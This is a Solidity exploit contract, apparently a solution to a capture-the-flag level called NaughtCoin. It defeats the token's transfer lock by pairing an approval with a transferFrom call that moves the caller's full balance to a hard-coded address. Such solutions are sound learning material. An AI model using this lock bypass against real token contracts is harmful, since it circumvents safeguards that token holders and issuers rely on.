pragma solidity ^0.8.10;

interface INaughtCoin {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);    
    function allowance(address owner, address spender) external view returns (uint256);
}

contract AttackNaughtCoin {
    address public victim;
    INaughtCoin public nc;

    constructor(address _victim) {
        victim = _victim;        
        nc = INaughtCoin(victim);                
    }

    function attack() public {
        //beforehand, call nc.approve(spender, amount) from msg.sender (the token holder)
        //where spender is this contract address, giving this contract permission to transfer them
        uint256 maxTokens = nc.balanceOf(msg.sender);        
        nc.transferFrom(msg.sender, 0xA36f37e54180d59A9eC172d0f4A5F6c5Ba4F04A3, maxTokens);        
    }
}